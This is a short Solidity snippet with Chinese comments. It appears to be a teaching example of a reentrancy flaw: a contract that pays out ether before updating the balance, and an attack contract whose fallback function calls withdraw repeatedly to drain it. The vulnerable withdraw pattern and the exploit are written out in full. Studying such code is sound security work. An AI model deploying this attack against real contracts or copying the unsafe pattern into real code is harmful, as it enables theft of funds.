contract ReentranceContract {
    mapping(address=>uint) public accountBalance;
    function withdraw(uint _amount) {
        if (accountBalance[msg.sender] >= _amount) {
            // 此处包含重入漏洞
            msg.sender.call.value(_amount)();
            accountBalance[msg.sender] -= _amount;
        }
    }
    function() public payable{}
}

contract AttackContract{
    ReentranceContract public entrance;
    constructor(address _target) public{
        entrance = ReentranceContract(_target);
    }
    function attack() payable{
        entrance.withdraw(0.5 ether);
    }
    function() public payable{
        // 再次调用了ReentranceContract
        entrance.withdraw(0.5 ether);
    }
}


